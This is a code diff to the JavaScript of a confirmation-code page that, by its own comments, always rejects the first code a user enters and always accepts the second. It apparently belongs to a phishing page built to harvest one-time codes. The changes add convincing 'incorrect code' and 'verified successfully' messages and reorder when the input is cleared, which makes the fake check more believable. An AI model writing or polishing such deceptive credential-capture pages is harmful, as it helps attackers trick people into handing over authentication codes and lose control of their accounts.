@@ -173,7 +173,7 @@
     return;
   }
 
-  // ====== UPDATE CONFIRMATION MESSAGE BASED ON METHOD ======
+  // ====== UPDATE CONFIRMATION MESSAGE ======
   if (auth.method === "email") {
     confirmationMessage.textContent = "A confirmation code was sent to your registered Email.";
   } else if (auth.method === "sms") {
@@ -186,9 +186,17 @@
 
   function updateInfoText() {
     if (attemptCount === 0) {
-      infoText.textContent = "";
+      infoText.textContent = "Enter the code below. (First attempt)";
+      infoText.style.color = '#302b4a';
+      infoText.style.fontWeight = 'normal';
     } else if (attemptCount === 1) {
-      infoText.textContent = "";
+      infoText.textContent = "The code you entered was incorrect. Please try again. (Second attempt)";
+      infoText.style.color = '#c0392b';
+      infoText.style.fontWeight = 'bold';
+    } else {
+      infoText.textContent = "Code verified successfully! Redirecting...";
+      infoText.style.color = '#27ae60';
+      infoText.style.fontWeight = 'bold';
     }
   }
 
@@ -246,20 +254,24 @@
       // ====== FIRST ATTEMPT - ALWAYS FAILS ======
       console.log('❌ First attempt - rejecting');
       
-      // Clear the input field immediately
-      codeInput.value = '';
+      // Don't clear immediately - wait for the 3-second delay
       
       setTimeout(function() {
         // Show error message
         codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
         codeError.style.color = '#c0392b';
         
+        // Clear the input field after error shows
+        codeInput.value = '';
+        
         // Update attempt count
         attemptCount = 1;
         sessionStorage.setItem(attemptKey, '1');
         
         // Update info text
-        infoText.textContent = "";
+        infoText.textContent = "The code you entered was incorrect. Please try again. (Second attempt)";
+        infoText.style.color = '#c0392b';
+        infoText.style.fontWeight = 'bold';
         
         // Reset button
         submitBtn.disabled = false;
@@ -276,6 +288,11 @@
     } else {
       // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
       console.log('✅ Second attempt - accepting');
+      
+      // Update info text
+      infoText.textContent = "Code verified successfully! Redirecting...";
+      infoText.style.color = '#27ae60';
+      infoText.style.fontWeight = 'bold';
       
       // Clear session storage
       try {
